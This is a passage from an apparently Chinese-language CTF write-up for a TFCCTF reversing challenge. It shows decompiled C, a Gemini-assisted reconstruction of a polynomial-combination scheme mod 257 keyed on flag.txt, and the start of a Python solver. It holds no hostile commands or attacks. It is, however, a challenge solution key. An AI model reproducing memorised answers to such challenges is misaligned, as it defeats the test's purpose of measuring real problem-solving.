&#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          uVar12 = uVar12 + <span class="number">1</span>;</span><br><span class="line">          pcVar3 = pcVar3 + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (sVar1 != uVar12);</span><br><span class="line">      &#125;</span><br><span class="line">LAB_00008bfc:</span><br><span class="line">      <span class="built_in">free</span>(__ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(local_dc,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">  __dest = (byte *)<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">goto</span> LAB_000088a8;</span><br><span class="line">LAB_00008840:</span><br><span class="line">  uVar5 = uVar7;</span><br><span class="line">  <span class="keyword">if</span> ((*pcVar3 != <span class="string">&#x27; &#x27;</span>) &amp;&amp; (<span class="number">4</span> &lt; (byte)(*pcVar3 - <span class="number">9U</span>))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (uVar12 &lt; sVar1) &#123;</span><br><span class="line">      sVar1 = sVar1 - uVar12;</span><br><span class="line">      __dest = (byte *)<span class="built_in">malloc</span>(sVar1);</span><br><span class="line">      <span class="built_in">memcpy</span>(__dest,__ptr + uVar12,sVar1);</span><br><span class="line">      <span class="built_in">free</span>(__ptr);</span><br><span class="line">      pbVar9 = local_dc;</span><br><span class="line">      local_dc[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">0xb</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">0xc</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">0xd</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">0xe</span>] = <span class="number">0</span>;</span><br><span class="line">      local_dc[<span class="number">0xf</span>] = <span class="number">0</span>;</span><br><span class="line">      pbVar4 = pbVar9 + sVar1;</span><br><span class="line">      pbVar6 = __dest;</span><br><span class="line">      <span class="keyword">goto</span> LAB_0000889c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LAB_00008bfc;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar3 = pcVar3 + <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (uVar5 &lt;= uVar12) <span class="keyword">goto</span> LAB_00008bfc;</span><br><span class="line">  uVar7 = uVar5 - <span class="number">1</span>;</span><br><span class="line">  sVar1 = uVar5;</span><br><span class="line">  <span class="keyword">goto</span> LAB_00008840;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    pbVar9 = pbVar9 + <span class="number">1</span>;</span><br><span class="line">    pbVar6 = pbVar6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (pbVar9 == pbVar4) <span class="keyword">break</span>;</span><br><span class="line">LAB_0000889c:</span><br><span class="line">    *pbVar9 = *pbVar6;</span><br><span class="line">    <span class="keyword">if</span> (pbVar9 == local_dc + <span class="number">0xf</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_000088a8:</span><br><span class="line">  pbVar6 = local_dc;</span><br><span class="line">  <span class="built_in">free</span>(__dest);</span><br><span class="line">  <span class="built_in">memset</span>(local_6c,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  iVar10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    local_6c[iVar10] = (uint)*pbVar6;</span><br><span class="line">    iVar10 = iVar10 + <span class="number">1</span>;</span><br><span class="line">    pbVar6 = pbVar6 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (iVar10 != <span class="number">0x10</span>);</span><br><span class="line">  puVar18 = (uint *)(local_dc + <span class="number">0x10</span>);</span><br><span class="line">  srandom(<span class="number">0x539</span>);</span><br><span class="line">  puVar13 = puVar18;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    *puVar13 = <span class="number">0</span>;</span><br><span class="line">    puVar13[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar13[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    iVar14 = <span class="number">0</span>;</span><br><span class="line">    iVar10 = iVar14;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (iVar10 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (; iVar14 &lt; <span class="number">4</span>; iVar14 = iVar14 + <span class="number">1</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        uVar12 = rand();</span><br><span class="line">      &#125; <span class="keyword">while</span> (<span class="number">0x7fffff7e</span> &lt; uVar12);</span><br><span class="line">      uVar12 = uVar12 % <span class="number">0x101</span>;</span><br><span class="line">      <span class="keyword">if</span> (uVar12 != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iVar10 == iVar14) &#123;</span><br><span class="line">          func_1430(puVar13,<span class="number">1</span>,iVar10,<span class="number">0</span>,uVar12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          func_1430(puVar13,<span class="number">2</span>,iVar10,iVar14,uVar12);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      iVar14 = iVar14 + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((iVar14 != <span class="number">8</span>) || (iVar14 = iVar10 + <span class="number">1</span>, iVar10 = iVar14, iVar14 != <span class="number">8</span>));</span><br><span class="line">    iVar10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        uVar12 = rand();</span><br><span class="line">      &#125; <span class="keyword">while</span> (<span class="number">0x7fffff7e</span> &lt; uVar12);</span><br><span class="line">      <span class="keyword">if</span> (uVar12 % <span class="number">0x101</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        func_1430(puVar13,<span class="number">1</span>,iVar10,<span class="number">0</span>,uVar12 % <span class="number">0x101</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      iVar10 = iVar10 + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (iVar10 != <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      uVar12 = rand();</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0x7fffff7e</span> &lt; uVar12);</span><br><span class="line">    <span class="keyword">if</span> (uVar12 % <span class="number">0x101</span> != <span class="number">0</span>) &#123;</span><br><span class="line">      func_1430(puVar13,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,uVar12 % <span class="number">0x101</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar12 = puVar13[<span class="number">1</span>];</span><br><span class="line">    piVar11 = (<span class="type">int</span> *)*puVar13;</span><br><span class="line">    <span class="keyword">if</span> (uVar12 != <span class="number">0</span>) &#123;</span><br><span class="line">      uVar7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (*piVar11 != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((*piVar11 == <span class="number">2</span>) &amp;&amp; ((piVar11[<span class="number">1</span>] &lt; <span class="number">4</span> || (piVar11[<span class="number">2</span>] &lt; <span class="number">4</span>)))) <span class="keyword">goto</span> LAB_00008a30;</span><br><span class="line">          uVar7 = uVar7 + <span class="number">1</span>;</span><br><span class="line">          piVar11 = piVar11 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> (uVar12 == uVar7) <span class="keyword">goto</span> LAB_000089fc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (piVar11[<span class="number">1</span>] &lt; <span class="number">4</span>) <span class="keyword">goto</span> LAB_00008a30;</span><br><span class="line">        uVar7 = uVar7 + <span class="number">1</span>;</span><br><span class="line">        piVar11 = piVar11 + <span class="number">4</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (uVar12 != uVar7);</span><br><span class="line">    &#125;</span><br><span class="line">LAB_000089fc:</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      uVar12 = rand();</span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="type">int</span>)uVar12 &lt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      uVar7 = rand();</span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="type">int</span>)uVar7 &lt; <span class="number">0</span>);</span><br><span class="line">    func_1430(puVar13,<span class="number">2</span>,uVar12 &amp; <span class="number">3</span>,(uVar7 &amp; <span class="number">3</span>) + <span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line">LAB_00008a30:</span><br><span class="line">    puVar13 = puVar13 + <span class="number">3</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (puVar13 != local_9c);</span><br><span class="line">  puStack_e4 = local_6c;</span><br><span class="line">  puVar13 = local_9c;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    *puVar13 = <span class="number">0</span>;</span><br><span class="line">    puVar13[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar13[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    puVar15 = puVar18;</span><br><span class="line">    puVar16 = puStack_e4;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      iVar10 = (<span class="type">int</span>)*puVar16 % <span class="number">0x101</span>;</span><br><span class="line">      <span class="keyword">if</span> (iVar10 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        iVar10 = iVar10 + <span class="number">0x101</span>;</span><br><span class="line">LAB_00008a6e:</span><br><span class="line">        uVar12 = puVar15[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (uVar12 != <span class="number">0</span>) &#123;</span><br><span class="line">          puVar19 = (undefined4 *)*puVar15;</span><br><span class="line">          uVar7 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">            iVar14 = (iVar10 * puVar19[<span class="number">3</span>]) % <span class="number">0x101</span>;</span><br><span class="line">            <span class="keyword">if</span> (iVar14 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">              iVar14 = iVar14 + <span class="number">0x101</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            uVar7 = uVar7 + <span class="number">1</span>;</span><br><span class="line">            func_1430(puVar13,*puVar19,puVar19[<span class="number">1</span>],puVar19[<span class="number">2</span>],iVar14);</span><br><span class="line">            puVar19 = puVar19 + <span class="number">4</span>;</span><br><span class="line">          &#125; <span class="keyword">while</span> (uVar12 != uVar7);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (iVar10 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_00008a6e;</span><br><span class="line">      puVar15 = puVar15 + <span class="number">3</span>;</span><br><span class="line">      puVar16 = puVar16 + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (puVar15 != local_9c);</span><br><span class="line">    puStack_e4 = puStack_e4 + <span class="number">4</span>;</span><br><span class="line">    puVar13 = puVar13 + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (local_6c == puVar13) &#123;</span><br><span class="line">      iVar10 = <span class="number">0</span>;</span><br><span class="line">      puVar13 = local_9c;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        iVar10 = iVar10 + <span class="number">1</span>;</span><br><span class="line">        iVar14 = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;P%d(&quot;</span>,iVar10);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          iVar14 = iVar14 + <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">0x2c</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;x%d&quot;</span>,iVar14);</span><br><span class="line">        &#125; <span class="keyword">while</span> (iVar14 != <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;) = &quot;</span>);</span><br><span class="line">        sVar1 = puVar13[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (sVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;0 (mod %d)\n&quot;</span>,<span class="number">0x101</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          __dest_00 = (<span class="type">int</span> *)<span class="built_in">malloc</span>(sVar1 &lt;&lt; <span class="number">4</span>);</span><br><span class="line">          sVar17 = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">memcpy</span>(__dest_00,(<span class="type">void</span> *)*puVar13,sVar1 &lt;&lt; <span class="number">4</span>);</span><br><span class="line">          qsort(__dest_00,sVar1,<span class="number">0x10</span>,func_15f0);</span><br><span class="line">          bVar8 = <span class="literal">false</span>;</span><br><span class="line">          piVar11 = __dest_00;</span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">            iVar14 = piVar11[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">if</span> (iVar14 != <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="keyword">if</span> (bVar8) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; + &quot;</span>);</span><br><span class="line">                iVar14 = piVar11[<span class="number">3</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (*piVar11 == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                iVar2 = piVar11[<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (*piVar11 == <span class="number">1</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (iVar14 == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;x%d&quot;</span>,iVar2);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d*x%d&quot;</span>,iVar14,iVar2);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (piVar11[<span class="number">2</span>] == piVar11[<span class="number">1</span>]) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (iVar14 == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;x%d^2&quot;</span>,iVar2);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d*x%d^2&quot;</span>,iVar14,iVar2);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (iVar14 == <span class="number">1</span>) &#123;</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;x%d*x%d&quot;</span>,iVar2,piVar11[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;%d*x%d*x%d&quot;</span>,iVar14,iVar2);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              bVar8 = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sVar17 = sVar17 + <span class="number">1</span>;</span><br><span class="line">            piVar11 = piVar11 + <span class="number">4</span>;</span><br><span class="line">          &#125; <span class="keyword">while</span> (sVar1 != sVar17);</span><br><span class="line">          <span class="built_in">free</span>(__dest_00);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot; (mod %d)\n&quot;</span>,<span class="number">0x101</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        puVar13 = puVar13 + <span class="number">3</span>;</span><br><span class="line">        puStack_e0 = local_9c;</span><br><span class="line">      &#125; <span class="keyword">while</span> (iVar10 != <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">free</span>((<span class="type">void</span> *)*puVar18);</span><br><span class="line">        *puVar18 = <span class="number">0</span>;</span><br><span class="line">        puVar18[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        puVar18[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        puVar18 = puVar18 + <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">free</span>((<span class="type">void</span> *)*puStack_e0);</span><br><span class="line">        *puStack_e0 = <span class="number">0</span>;</span><br><span class="line">        puStack_e0[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        puStack_e0[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        puStack_e0 = puStack_e0 + <span class="number">3</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (puVar18 != local_9c);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用Gemini分析可以得到：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设存在一个多项式处理的结构和函数</span></span><br><span class="line"><span class="comment">// Term: 表示多项式中的一个项，如 5*x1*x3</span></span><br><span class="line"><span class="comment">// Polynomial: 多个Term的集合</span></span><br><span class="line"><span class="comment">// generate_random_polynomial(): 创建一个随机的二次多项式</span></span><br><span class="line"><span class="comment">// combine_polynomials(): 将多个多项式进行线性组合</span></span><br><span class="line"><span class="comment">// print_polynomial(): 以可读格式打印多项式</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULUS 257 <span class="comment">// 0x101</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 读取并处理输入文件</span></span><br><span class="line">    <span class="type">char</span>* file_content = <span class="built_in">read_file_content</span>(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file_content) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span>* trimmed_input = <span class="built_in">trim_whitespace</span>(file_content); <span class="comment">// 去除首尾空白字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 将输入的前16个字节作为系数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> input_coeffs[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span> &amp;&amp; i &lt; <span class="built_in">strlen</span>(trimmed_input); ++i) &#123;</span><br><span class="line">        input_coeffs[i] = (<span class="type">unsigned</span> <span class="type">char</span>)trimmed_input[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(file_content); <span class="comment">// 释放原始文件内容内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 使用固定种子生成一个基础的随机多项式系统</span></span><br><span class="line">    <span class="comment">// srandom(0x539) 相当于 srandom(1337)，这意味着每次运行生成的“随机”多项式都是一样的</span></span><br><span class="line">    <span class="built_in">srandom</span>(<span class="number">1337</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 生成4个基础的随机二次多项式 Q0, Q1, Q2, Q3</span></span><br><span class="line">    <span class="comment">// 每个多项式包含8个变量 (x1, ..., x8)</span></span><br><span class="line">    Polynomial base_polynomials[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        base_polynomials[i] = <span class="built_in">generate_random_polynomial</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 根据输入系数，对基础多项式进行线性组合，生成最终的4个多项式 P0, P1, P2, P3</span></span><br><span class="line">    <span class="comment">// 计算逻辑如下：</span></span><br><span class="line">    <span class="comment">// P0 = input_coeffs[0]*Q0 + input_coeffs[1]*Q1 + input_coeffs[2]*Q2 + input_coeffs[3]*Q3</span></span><br><span class="line">    <span class="comment">// P1 = input_coeffs[4]*Q0 + input_coeffs[5]*Q1 + input_coeffs[6]*Q2 + input_coeffs[7]*Q3</span></span><br><span class="line">    <span class="comment">// ...以此类推</span></span><br><span class="line">    Polynomial final_polynomials[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        final_polynomials[i] = <span class="built_in">create_empty_polynomial</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">// 将 input_coeffs[i*4 + j] 作为权重，与 base_polynomials[j] 相乘后累加</span></span><br><span class="line">            <span class="built_in">add_scaled_polynomial</span>(&amp;final_polynomials[i], base_polynomials[j], input_coeffs[i*<span class="number">4</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 打印最终的4个多项式方程组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成的方程组如下 (所有运算都在模 %d 意义下进行):\n&quot;</span>, MODULUS);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;P%d(x1,x2,...,x8) = &quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">print_polynomial</span>(final_polynomials[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; (mod %d)\n&quot;</span>, MODULUS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 清理内存</span></span><br><span class="line">    <span class="comment">// ... 释放所有动态分配的内存 ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于每次运行，它会生成四个随机的八元多项式 </p>
<div>
$$
Q\_0,Q\_1,Q\_2,Q\_3
$$
</div>

<p>（因为每次的随机数种子都是 1337，所以每一次运行得到的这四个多项式都是一样的），<br>然后对于输入的 <code>flag.txt</code>，它会取出前 16 个字节得到</p>
<div>
$$
a\_0,a\_1,\cdots,a\_{16},
$$
</div>

<p>然后计算：</p>
<div>
$$
\begin{cases}
P\_0 \equiv a\_0Q\_0+a\_1Q\_1+a\_2Q\_2+a\_3Q\_3 \pmod{257}\\
P\_1 \equiv a\_4Q\_0+a\_5Q\_1+a\_6Q\_2+a\_7Q\_3 \pmod{257}\\
P\_2 \equiv a\_8Q\_0+a\_9Q\_1+a\_{10}Q\_2+a\_{11}Q\_3 \pmod{257}\\
P\_3 \equiv a\_{12}Q\_0+a\_{13}Q\_1+a\_{14}Q\_2+a\_{15}Q\_3 \pmod{257}
\end{cases}
$$
</div>

<p>显然，我们令 </p>
<div>
$$
a\_0,a\_5,a\_{10},a\_{15} = 1,
$$
</div>

<p>其余为 0 即可得到：</p>
<div>
$$
\begin{cases}
P\_0 \equiv Q\_0 \pmod{257}\\
P\_1 \equiv Q\_1 \pmod{257}\\
P\_2 \equiv Q\_2 \pmod{257}\\
P\_3 \equiv Q\_3 \pmod{257}
\end{cases}
$$
</div>

<p>那么我们只需要令 <code>flag.txt</code> 中的内容为<code>\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01</code></p>
<p>并使用 Pwn 的题目 <strong>MUCUSKY</strong> 的附件中给出的 <code>qemu</code> 来运行本题的程序，即可得到</p>
<div>
$$
Q\_0,Q\_1,Q\_2,Q\_3
$$
</div>

<p>再对比题目给出的</p>
<div>
$$
P\_0,P\_1,P\_2,P\_3
$$
</div>
来解系数方程就可以得到 flag。

<p>首先通过如下代码生成内容为<code>\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01</code>的<code>flag.txt</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-TFCCTF/2.png" alt="1"></p>
<p>再分别求解系数方程就可以得到flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">p = <span class="number">257</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># R.&lt;x1, x2, x3, x4, x5, x6, x7, x8&gt; = Zmod(p)[]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># P0 = 122 + 248*x1 + 32*x2 + 106*x3 + 16*x4 + 119*x5 + 228*x6 + 124*x7 + 196*x8 + 210*x1*x5 + 145*x1*x6 + 59*x1*x7 + 118*x1*x8 + 108*x2*x5 + 